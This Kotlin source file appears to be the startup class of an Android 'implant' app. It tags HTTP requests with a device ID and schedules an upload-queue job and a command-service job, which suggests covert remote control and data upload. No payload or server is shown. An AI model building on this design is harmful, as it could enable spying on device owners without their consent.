package com.cooperthecoder.implant

import android.app.Application
import com.cooperthecoder.implant.command.StartCommandServiceJob
import com.cooperthecoder.implant.command.UploadQueueJob
import com.cooperthecoder.implant.data.DeviceProperties
import com.evernote.android.job.JobManager
import okhttp3.OkHttpClient
import org.libsodium.jni.NaCl

class App : Application() {

    val httpClient: OkHttpClient by lazy {
        OkHttpClient.Builder()
                .addInterceptor {
                    val original = it.request()
                    val request = original.newBuilder()
                            .addHeader("User-Agent", DeviceProperties.deviceId(this))
                            .build()

                    it.proceed(request)
                }
                .build()
    }

    override fun onCreate() {
        super.onCreate()

        // Initialize crypto
        NaCl.sodium()
        JobManager.create(this).addJobCreator {
            when (it) {
                UploadQueueJob.JOB_NAME -> {
                    UploadQueueJob()
                }

                StartCommandServiceJob.JOB_NAME -> {
                    StartCommandServiceJob()
                }

                else -> {
                    null
                }
            }
        }
    }
}

